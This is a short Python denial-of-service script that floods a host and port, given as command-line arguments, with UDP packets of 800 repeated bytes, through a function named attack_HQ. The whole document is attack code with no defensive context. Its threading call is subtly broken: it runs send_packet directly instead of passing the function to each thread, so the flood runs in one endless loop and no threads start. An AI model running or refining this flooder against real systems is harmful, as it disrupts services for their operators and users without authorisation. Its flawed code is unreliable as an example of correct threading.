import sys
import socket
import threading

host = str(sys.argv[1])
port = int(sys.argv[2])

loops = 10000

def send_packet(amplifier):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(host), int(port)))
        while True: s.send(b"\x99" * amplifier)
    except: return s.close()

def attack_HQ():
    for sequence in range(loops):
        threading.Thread(target=send_packet(800), daemon=True).start()

attack_HQ()
